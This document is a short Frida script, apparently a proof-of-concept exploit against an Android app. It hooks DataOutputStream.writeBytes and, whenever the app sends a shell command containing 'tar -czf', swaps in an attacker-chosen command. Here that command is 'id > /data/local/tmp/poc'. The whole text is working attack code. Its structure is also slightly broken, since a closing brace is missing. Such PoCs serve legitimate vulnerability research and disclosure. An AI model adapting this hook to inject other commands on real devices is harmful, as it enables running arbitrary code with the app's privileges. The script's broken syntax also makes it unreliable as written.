Java.perform(() => {
    let DataOutputStream = Java.use("java.io.DataOutputStream")

    DataOutputStream.writeBytes.overload('java.lang.String').implementation = function(cmd) {
        if (cmd.indexOf("tar -czf") !== -1) {
            console.log(`[+] original cmd:  ${cmd}`)

            let modifiedCmd = "id > /data/local/tmp/poc\n"
            console.log("[!] check /data/local/tmp/poc")

            return this.writeBytes(modifiedCmd)
        }

        return this.writeBytes(cmd) // maintain the flow of the app
  
})
